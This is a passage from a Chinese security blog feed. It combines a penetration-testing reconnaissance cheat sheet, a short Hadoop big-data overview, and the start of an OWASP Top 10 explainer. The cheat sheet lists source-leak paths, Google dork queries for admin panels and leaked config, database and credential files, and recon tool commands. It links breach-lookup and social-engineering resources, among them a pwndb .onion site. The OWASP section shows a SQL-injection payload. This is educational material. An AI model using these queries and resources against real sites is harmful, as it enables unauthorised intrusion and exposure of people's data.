<h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><p>wafw00f<br>项目地址：<a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p>
<h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><ul>
<li><p>常见源码泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;.bzr&#x2F;</span><br><span class="line">&#x2F;CVS&#x2F;Entries</span><br><span class="line">&#x2F;CVS&#x2F;Root</span><br><span class="line">&#x2F;.DS_Store  MacOS自动生成</span><br><span class="line">&#x2F;.hg&#x2F;</span><br><span class="line">&#x2F;.svn&#x2F; (&#x2F;.svn&#x2F;entries)</span><br><span class="line">&#x2F;.git&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">Robots.txt</span><br></pre></td></tr></table></figure>
<p>上述源码泄露在Github上都可以找到相应的利用工具</p>
</li>
<li><p>源码泄露扫描工具<br>将常见源码泄露加入字典配合FUZZ、御剑等扫描器进行扫描收集</p>
</li>
<li><p>源码泄露利用工具</p>
<p>  .git源码泄露：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a><br>  .DS_Store泄露：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a><br>  .bzr、CVS、.svn、.hg源码泄露：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a></p>
</li>
</ul>
<h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><ul>
<li>网站备份文件泄露常见名称<br><code>backup
db
data
web
wwwroot
database
www
code
test
admin
user
sql</code></li>
<li>网站备份文件泄露常见后缀<br><code>.bak
.html
_index.html
.swp
.rar
.txt
.zip
.7z
.sql
.tar.gz
.tgz
.tar</code></li>
<li>网站备份文件泄露扫描工具<br>常见扫描工具有：Test404网站备份文件扫描器 v2.0、ihoneyBakFileScan等<br>ihoneyBakFileScan v0.2 多进程批量网站备份文件泄露扫描工具，根据域名自动生成相关扫描字典，自动记录扫描成功的备份地址到文件</li>
</ul>
<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><h4 id="GoogleHacking常用语法"><a href="#GoogleHacking常用语法" class="headerlink" title="GoogleHacking常用语法"></a>GoogleHacking常用语法</h4><p>1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件<br>2、intitle： 把网页标题中的某个字符作为搜索的条件<br>3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>4、filetype/ext： 指定一个格式类型的文件作为搜索对象<br>5、inurl： 搜索包含指定字符的URL<br>6、site： 在指定的(域名)站点搜索相关内容</p>
<h4 id="GoogleHacking其他语法"><a href="#GoogleHacking其他语法" class="headerlink" title="GoogleHacking其他语法"></a>GoogleHacking其他语法</h4><p>1、引号 ‘’ “ 把关键字打上引号后，把引号部分作为整体来搜索<br>2、or 同时搜索两个或更多的关键字<br>3、link 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL<br>4、info 查找指定站点的一些基本信息</p>
<h4 id="GoogleHackingDatabase"><a href="#GoogleHackingDatabase" class="headerlink" title="GoogleHackingDatabase"></a>GoogleHackingDatabase</h4><ul>
<li><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">google-hacking-database</a></li>
</ul>
<h4 id="GoogleHacking典型用法"><a href="#GoogleHacking典型用法" class="headerlink" title="GoogleHacking典型用法"></a>GoogleHacking典型用法</h4><ul>
<li><p>管理后台地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传类漏洞地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:file</span><br><span class="line">site:target.com inurl:upload</span><br></pre></td></tr></table></figure>
</li>
<li><p>注入页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑器页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure>
</li>
<li><p>目录遍历漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com intitle:index.of</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>phpinfo()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置文件泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>数据库文件泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure>
</li>
<li><p>日志文件泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.log</span><br></pre></td></tr></table></figure>
</li>
<li><p>备份和历史文件泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure>
</li>
<li><p>公开文件泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure>
</li>
<li><p>邮箱信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件</span><br><span class="line">site:target.com email</span><br></pre></td></tr></table></figure>
</li>
<li><p>社工信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="JS获取敏感接口"><a href="#JS获取敏感接口" class="headerlink" title="JS获取敏感接口"></a>JS获取敏感接口</h3><h4 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h4><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。</p>
<ul>
<li>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install requests bs4</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder.git</span><br></pre></td></tr></table></figure></li>
<li>使用<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u http:&#x2F;&#x2F;www.mi.com</span><br><span class="line">python3 JSFinder.py -u http:&#x2F;&#x2F;www.mi.com -d</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="LinkFinder"><a href="#LinkFinder" class="headerlink" title="LinkFinder"></a>LinkFinder</h4><p>该工具通过网站中的JS文件来发现服务端、敏感信息、隐藏控制面板的URL链接等有用信息，可最大化地提高URL发现效率</p>
<ul>
<li>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;GerbenJavado&#x2F;LinkFinder.git</span><br><span class="line">cd LinkFinder</span><br><span class="line">python2 setup.py install</span><br></pre></td></tr></table></figure></li>
<li>使用<br>在线JavaScript文件中查找端点的最基本用法，并将结果输出到results.html：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python linkfinder.py -i https:&#x2F;&#x2F;example.com&#x2F;1.js -o results.html</span><br></pre></td></tr></table></figure>
CLI输出（不使用jsbeautifier，这使得它非常快）：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyhon linkfinder.py -i https:&#x2F;&#x2F;example.com&#x2F;1.js -o cli</span><br></pre></td></tr></table></figure>
分析整个域及其JS文件：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python linkfinder.py -i https:&#x2F;&#x2F;example.com -d</span><br></pre></td></tr></table></figure>
Burp输入（在目标中选择要保存的文件，右键单击，Save selected items将该文件作为输入）：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python linkfinder.py -i burpfile -b</span><br></pre></td></tr></table></figure>
枚举JavaScript文件的整个文件夹，同时查找以/ api /开头的终结点，并最终将结果保存到results.html：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python linkfinder.py -i &#39;Desktop&#x2F;*.js&#39; -r ^&#x2F;api&#x2F; -o results.html</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="目录-amp-后台扫描"><a href="#目录-amp-后台扫描" class="headerlink" title="目录&amp;后台扫描"></a>目录&amp;后台扫描</h3><p>工具</p>
<pre><code>7kbscan-WebPathBrute  https://github.com/7kbstorm/7kbscan-WebPathBrute
DirMap        https://github.com/H4ckForJob/dirmap
dirsearch     https://github.com/maurosoria/dirsearch
Fuzz-gobuster https://github.com/OJ/gobuster
Fuzz-dirbuster OWASP kali自带
Fuzz-wfuzz    https://github.com/xmendez/wfuzz
Test404轻量后台扫描器+v2.0
御剑</code></pre><p>目录扫描、后台扫描、Web漏洞模糊测试–&gt;Fuzz</p>
<pre><code>基于Go开发：gobuster
基于Java开发：dirbuster
基于Python开发：wfuzz</code></pre><h3 id="越权查询"><a href="#越权查询" class="headerlink" title="越权查询"></a>越权查询</h3><p>遍历uid获得身份信息等</p>
<h3 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h3><p>通过代码托管平台搜索敏感信息（内部邮箱账号密码、数据库账号密码等）</p>
<ul>
<li>github<br>github :<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a><br>Github泄露扫描系统开发：<a href="https://sec.xiaomi.com/article/37" target="_blank" rel="noopener">https://sec.xiaomi.com/article/37</a><br>GitHub敏感信息泄露监控：<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">GSIL</a>、<a href="https://github.com/VKSRC/Github-Monitor" target="_blank" rel="noopener">Github-Monitor</a><br>在GitHub中一般通过搜索网站域名、网站JS路径、网站备案、网站下的技术支持等进行敏感信息查询</li>
<li>gitee<br><a href="https://gitee.com/" target="_blank" rel="noopener">https://gitee.com/</a></li>
<li>gitcafe<br>GitCafe一个基于代码托管服务打造的技术协作与分享平台</li>
</ul>
<h3 id="Whois-amp-备案查询"><a href="#Whois-amp-备案查询" class="headerlink" title="Whois&amp;备案查询"></a>Whois&amp;备案查询</h3><p>通过Whois和备案查询得到网站的注册人、手机号、邮箱等</p>
<h3 id="公网网盘"><a href="#公网网盘" class="headerlink" title="公网网盘"></a>公网网盘</h3><p>放在公网网盘的资料可能会被在线云网盘搜索的网站抓取–&gt;利用云网盘搜索工具搜集敏感文件，一般直接输入厂商名字进行搜索:<br>凌风云搜索：<a href="https://www.lingfengyun.com/" target="_blank" rel="noopener">https://www.lingfengyun.com/</a><br>小白盘搜索：<a href="https://www.xiaobaipan.com/" target="_blank" rel="noopener">https://www.xiaobaipan.com/</a><br>大力盘搜索：<a href="https://www.dalipan.com/" target="_blank" rel="noopener">https://www.dalipan.com/</a><br>小不点搜索（微盘）：<a href="https://www.xiaoso.net/" target="_blank" rel="noopener">https://www.xiaoso.net/</a><br>百度网盘爬取开源工具：<a href="https://github.com/gudegg/yunSpider" target="_blank" rel="noopener">https://github.com/gudegg/yunSpider</a></p>
<h3 id="网站截图"><a href="#网站截图" class="headerlink" title="网站截图"></a>网站截图</h3><p>对目标网站页面进行截图，通过截图找到敏感页面</p>
<ul>
<li>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;maaaaz&#x2F;webscreenshot.git</span><br><span class="line">apt-get update &amp;&amp; apt-get -y install phantomjs</span><br><span class="line">phantomjs -v</span><br><span class="line">Ubuntu 16 中安装 phantomjs 出现 QXcbConnection 问题</span><br><span class="line">    export QT_QPA_PLATFORM&#x3D;offscreen</span><br><span class="line">    export QT_QPA_FONTDIR&#x3D;&#x2F;usr&#x2F;share&#x2F;fonts</span><br></pre></td></tr></table></figure></li>
<li>使用<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd webscreenshot&#x2F;</span><br><span class="line">python2.7 webscreenshot.py -i url.txt</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="获取公开文件"><a href="#获取公开文件" class="headerlink" title="获取公开文件"></a>获取公开文件</h3><ul>
<li>snitch<br>Snitch可以针对指定域自动执行信息收集过程。此工具可帮助收集可通过Web搜索引擎找到的指定信息。在渗透测试的早期阶段，它可能非常有用。<br>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Smaash&#x2F;snitch.git</span><br></pre></td></tr></table></figure>
使用<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2.7 snitch.py -C &quot;site:whitehouse.gov filetype:pdf&quot; -P 100</span><br></pre></td></tr></table></figure>
Google Hacking<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="邮箱信息收集"><a href="#邮箱信息收集" class="headerlink" title="邮箱信息收集"></a>邮箱信息收集</h3><ul>
<li>Infoga<br>Infoga可从不同的公共源网络（搜索引擎，pgp密钥服务器和shodan）收集电子邮件帐户信息（ip，主机名，国家/地区…）。是一个用法非常简单的工具，但是，对于渗透测试的早期阶段，或者只是为了了解自己公司在互联网上的可见性是非常有效的。<br>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;Infoga.git &#x2F;data&#x2F;infoga</span><br><span class="line">cd &#x2F;data&#x2F;infoga</span><br><span class="line">pip3 install requests</span><br><span class="line">python3 infoga.py</span><br></pre></td></tr></table></figure>
使用<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 infoga.py --domain site.com --source all -v 3 | grep Email | cut -d &#39; &#39; -f 3 | uniq | sed -n &#39;&#x2F;-&#x2F;!p&#39;</span><br><span class="line">python3 infoga.py --info emailtest@site.com</span><br><span class="line">python3 infoga.py --info emailtest@site.com -b</span><br></pre></td></tr></table></figure></li>
<li>Google Hacking<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件</span><br><span class="line">site:target.com email</span><br></pre></td></tr></table></figure></li>
<li>Online Search Email<br>通过全球最大的几个数据泄露站点在线查询邮箱信息泄露情况<br><a href="https://monitor.firefox.com/" target="_blank" rel="noopener">https://monitor.firefox.com/</a><br><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">https://haveibeenpwned.com/</a><br><a href="https://ghostproject.fr/" target="_blank" rel="noopener">https://ghostproject.fr/</a></li>
</ul>
<h3 id="历史资产"><a href="#历史资产" class="headerlink" title="历史资产"></a>历史资产</h3><p>wayback :<a href="https://web.archive.org/" target="_blank" rel="noopener">https://web.archive.org/</a><br>wayback会记录网站版本更迭，可以获取到之前版本的网站，可能会找到一些后来删除的敏感资产信息，或者一些漏洞</p>
<h2 id="漏洞公共资源库"><a href="#漏洞公共资源库" class="headerlink" title="漏洞公共资源库"></a>漏洞公共资源库</h2><p><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener">国家信息安全漏洞库</a><br><a href="https://www.cnvd.org.cn/" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://www.seebug.org/?ref=www" target="_blank" rel="noopener">SeeBug</a><br><a href="http://vulhub.org.cn/view/global" target="_blank" rel="noopener">信息安全漏洞门户 VULHUB</a><br><a href="https://poc.shuziguanxing.com/#/" target="_blank" rel="noopener">数字观星</a><br><a href="http://www.nsfocus.net/index.php?act=sec_bug" target="_blank" rel="noopener">NSFOCUS绿盟科技</a><br><a href="http://www.bugscan.net/source/template/vulns/" target="_blank" rel="noopener">BugScan–漏洞插件社区</a><br><a href="https://src.sjtu.edu.cn/list/" target="_blank" rel="noopener">漏洞列表 | 教育行业漏洞报告平台（Beta）</a><br><a href="http://ivd.winicssec.com/" target="_blank" rel="noopener">工控系统行业漏洞库平台</a><br><a href="http://www.expku.com/" target="_blank" rel="noopener">exp库-打造中文最大exploit库</a><br><a href="">乌云漏洞库</a></p>
<p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-db</a><br><a href="https://sploitus.com/" target="_blank" rel="noopener">Sploitus | Exploit &amp; Hacktool Search Engine</a><br><a href="https://packetstormsecurity.org/" target="_blank" rel="noopener">packetstorm</a><br><a href="https://www.securityfocus.com/bid" target="_blank" rel="noopener">SecurityFocus</a><br><a href="https://cxsecurity.com/exploit/" target="_blank" rel="noopener">cxsecurity</a><br><a href="https://www.rapid7.com/db/" target="_blank" rel="noopener">rapid7 Vulnerability &amp; Exploit Database</a><br><a href="https://cve.circl.lu/" target="_blank" rel="noopener">Most recent entries - CVE-Search</a><br><a href="https://www.cvedetails.com/" target="_blank" rel="noopener">CVE security vulnerability database. Security vulnerabilities, exploits</a><br><a href="https://cve.mitre.org/cve/search_cve_list.html" target="_blank" rel="noopener">CVE mitre - Search CVE List</a><br><a href="https://www.us-cert.gov/ics" target="_blank" rel="noopener">美国官方工控数据库 ICS-CERT Landing | CISA</a><br><a href="http://www.routerpwn.com/" target="_blank" rel="noopener">路由器漏洞搜索 Routerpwn - One click exploits, generators, tools, news, vulnerabilities, poc</a></p>
<h2 id="shegong"><a href="#shegong" class="headerlink" title="shegong"></a>shegong</h2><h3 id="ku"><a href="#ku" class="headerlink" title="ku"></a>ku</h3><p><a href="https://dehashed.com/" target="_blank" rel="noopener">https://dehashed.com/</a><br><a href="https://aleph.occrp.org/" target="_blank" rel="noopener">https://aleph.occrp.org/</a><br><a href="https://www.blackbookonline.info/" target="_blank" rel="noopener">https://www.blackbookonline.info/</a><br><a href="http://pwndb2am4tzkvold.onion/" target="_blank" rel="noopener">http://pwndb2am4tzkvold.onion/</a></p>
<h3 id="UserRegistrationInformation"><a href="#UserRegistrationInformation" class="headerlink" title="UserRegistrationInformation"></a>UserRegistrationInformation</h3><ul>
<li><a href="https://www.reg007.com/" target="_blank" rel="noopener">REG007</a></li>
<li><a href="https://checkusernames.com/" target="_blank" rel="noopener">检查160个社交网络上的注册情况 Check Usernames - Social Media Username Availability</a></li>
<li><a href="https://knowem.com/" target="_blank" rel="noopener">检查用户名注册情况在500个主流网站上 KnowEm用户名搜索：社交媒体，域名和商标</a></li>
<li><a href="https://namechk.com/" target="_blank" rel="noopener">检查用户名注册情况，同时检查注册过哪些域名 Namechk | Username, Domain, and Trademark Search | Username Registration</a></li>
</ul>
<h3 id="IPInformation"><a href="#IPInformation" class="headerlink" title="IPInformation"></a>IPInformation</h3><ul>
<li><a href="http://chaipip.com/ip.php" target="_blank" rel="noopener">IP地址查询chaipip</a></li>
<li><a href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx" target="_blank" rel="noopener">高精度IP定位</a></li>
<li><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">IP查询IPIP.NET</a></li>
<li><a href="https://www.ip2location.com/demo/" target="_blank" rel="noopener">ip2location</a></li>
<li><a href="https://www.maxmind.com/en/geoip2-precision-demo" target="_blank" rel="noopener">maxmind</a></li>
<li><a href="https://www.ip138.com/" target="_blank" rel="noopener">ip138</a></li>
<li><a href="https://ip.cn/" target="_blank" rel="noopener">ip.cn</a></li>
</ul>
<h3 id="SomeProjects"><a href="#SomeProjects" class="headerlink" title="SomeProjects"></a>SomeProjects</h3><ul>
<li><a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">social-engineer-toolkit</a></li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>大数据分析概述</title>
    <url>/2020/05/07/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h3 id="大数据分析处理框架：hadoop"><a href="#大数据分析处理框架：hadoop" class="headerlink" title="大数据分析处理框架：hadoop"></a>大数据分析处理框架：hadoop</h3><p>开源,Java语言,低成本。始于2004年，2011年正式推出1.0.0版，最新的稳定版是：~~</p>
<a id="more"></a>
<h4 id="Hadoop架构-1"><a href="#Hadoop架构-1" class="headerlink" title="Hadoop架构(1):"></a>Hadoop架构(1):</h4><p>（安装包）Hadoop Common Package<br>提供系统交互及支撑</p>
<p>（分布管理系统）Hadoop Distributed File System<br>提供分布式文件管理功能</p>
<p>（任务调度）Hadoop YARN<br>●任务调度和集群资源管理</p>
<p>（map reduce）MapReduce Engine<br>●提供计算任务的分布式并行执行功能<br>统计所有文档中每个词出现的次数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function map (String name，String document) :</span><br><span class="line">    &#x2F;&#x2F;name: document name</span><br><span class="line">    &#x2F;&#x2F; document: document contents</span><br><span class="line">	for each word w in document :</span><br><span class="line">		emit (w, 1)</span><br><span class="line">function reduce (String word, Iterator partialCounts) :</span><br><span class="line">	&#x2F;&#x2F; word: a word</span><br><span class="line">	&#x2F;&#x2F; partialCounts: a list of aggregated partial counts</span><br><span class="line">	sum &#x3D; 0</span><br><span class="line">	for each pc in partialCounts:</span><br><span class="line">		sum +&#x3D; pc</span><br><span class="line">	emit (word, sum)</span><br></pre></td></tr></table></figure>
<h4 id="Hadoop架构-2"><a href="#Hadoop架构-2" class="headerlink" title="Hadoop架构(2):"></a>Hadoop架构(2):</h4><p>Hive<br>    数据仓库工具（仅作为一个工具，依赖数据库做支撑）<br>    可以将SQL语句转换为MapReduce任务运行,十分适合数据仓库的统计分析(可以直接写sql语句)<br>    面对传统数据库，以行为单位</p>
<p>HBase<br>    分布式数据库<br>    列数据库</p>
<p>Mahout<br>    并行机器学习<br>    分类、聚类、协同过滤等等<br>    <a href="http://mahout.apache.org/users/basics/algorithms.html" target="_blank" rel="noopener">http://mahout.apache.org/users/basics/algorithms.html</a></p>
<p>Spark<br>    “内存版的MapReduce”<br>    比MapReduce更为灵活高效的编程模型<br>    Spark SQL提供SQL语句的解析和执行功能<br>    Spark Streaming提供流数据处理功能<br>    MLlib是-一个机器学习包，类似Mahout<br>    GraphX提供并行化图计算功能</p>
<p>Hadoop是一个大数据处理的生态环境，包含众多子项目<br><img src="hadoop.png" alt=""></p>
<h3 id="大数据分析处理基本流程"><a href="#大数据分析处理基本流程" class="headerlink" title="大数据分析处理基本流程"></a>大数据分析处理基本流程</h3><p><img src="mss.png" alt=""></p>
<h4 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h4><p>数据获取:<br>定位需要分析的数据，抓取并存储(如HDFS)<br>在网关上部署探针程序，抓取HTTP请求并存储</p>
<p>数据清洗:<br>对可能影响后期分析的缺失数据，噪声数据，不规范数据进行处理<br>URL解码、无用URL过滤等等，得到干净的URL</p>
<h4 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h4><p>特征提取<br>从数据中提取特征，利用特征来表示样本<br>从URL中提取词语或字符串作为特征</p>
<p>特征选择<br>对特征进行评估，保留更有区分能力的特征，去除冗余特征<br>对特征进行信息增益计算，保留增益高的词语或者字符串，去除增益低的词语或字符串</p>
<h4 id="建模分析"><a href="#建模分析" class="headerlink" title="建模分析"></a>建模分析</h4><p>模型选择</p>
<p>选择什么样的模型来完成当前任务<br>采用分类算法来对URL进行二分类，如决策树</p>
<p>模型训练</p>
<p>利用现有数据训练模型<br>利用特征向量数据训练决策树</p>
<p>模型评测</p>
<p>评估当前模型的性能</p>
<h4 id="数据可视化，分析报告等。。"><a href="#数据可视化，分析报告等。。" class="headerlink" title="数据可视化，分析报告等。。"></a>数据可视化，分析报告等。。</h4><h3 id="大数据分析处理评测方法"><a href="#大数据分析处理评测方法" class="headerlink" title="大数据分析处理评测方法"></a>大数据分析处理评测方法</h3>]]></content>
  </entry>
  <entry>
    <title>OWASP_top10list</title>
    <url>/2020/05/06/MSFpro/</url>
    <content><![CDATA[<p>OWASP_top10</p>
<a id="more"></a>
<h2 id="OWASP简介"><a href="#OWASP简介" class="headerlink" title="OWASP简介"></a>OWASP简介</h2><p>OWASP（开放式web应用程序安全项目）关注web应用程序的安全。OWASP这个项目最有名的，也许就是它的”十大安全隐患列表”。这个列表不但总结了web应用程序最可能、最常见、最危险的十大安全隐患，还包括了如何消除这些隐患的建议。（另外，OWASP还有一些辅助项目和指南来帮助IT公司和开发团队来规范应用程序开发流程和测试流程，提高web产品的安全性。）这个”十大”差不多每隔三年更新一次。<!-- more --></p>
<h2 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10"></a>OWASP Top 10</h2><h3 id="A1-2017-注入"><a href="#A1-2017-注入" class="headerlink" title="A1:2017-注入"></a>A1:2017-注入</h3><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
<p>知识点简介<br>一些常见的注入，包括：SQL、OS命令、ORM、LDAP和表达式语言（EL）或OGNL注入。所有解释器的概念都是相同的。代码评审是最有效的检测应用程序的注入风险的办法之一，紧随其后的是对所有参数、字段、头、cookie、JSON和XML数据输入的彻底的DAST扫描。组织可以将SAST和DAST工具添加到CI/CD过程中，以便于在生产部署之前对现有或新检查的代码进行注入问题的预警。</p>
<p>案例场景<br>场景#1：应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String query &#x3D; &quot;SELECT * FROM accounts WHERE custID&#x3D;&#39;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>场景#2：同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如：Hibernate查询语言（HQL））：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Query HQLQuery &#x3D; session.createQuery(&quot;FROM accounts WHERE custID&#x3D;&#39;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#39;&quot;);</span><br></pre></td></tr></table></figure>
<p>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ‘or’1’=’1。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;accountView?id&#x3D;&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p>这样查询语句的意义就变成了从accounts表中返回所有的记录。更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p>
<p>如何防止?<br>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br>注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。<br>使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。<br>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。<br>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。<br>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</p>
<h3 id="A2-2017-失效的身份认证"><a href="#A2-2017-失效的身份认证" class="headerlink" title="A2:2017-失效的身份认证"></a>A2:2017-失效的身份认证</h3><p>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
<p>知识点简介<br>确认用户的身份、身份验证和会话管理非常重要，这些措施可用于将恶意的未经身份验证的攻击者与授权用户进行分离。如果您的应用程序存在如下问题，那么可能存在身份验证的脆弱性：</p>
